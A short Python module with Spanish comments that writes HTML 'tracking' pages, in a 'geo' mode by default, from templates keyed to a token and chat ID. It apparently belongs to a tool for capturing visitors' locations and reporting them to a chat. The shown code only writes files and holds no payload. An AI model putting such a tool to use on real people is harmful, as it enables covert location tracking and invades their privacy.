
import os
import uuid
from config import PAGES_DIR
from modules.tracking_templates import get_template

def generate_tracking_page(token, chat_id, type="geo"):
    """Genera archivo HTML de tracking"""
    filename = f"{type}_{uuid.uuid4().hex[:8]}.html"
    path = os.path.join(PAGES_DIR, filename)
    
    # Obtener contenido HTML desde las plantillas organizadas
    content = get_template(token, chat_id, mode=type)
    
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
        
    return filename, content
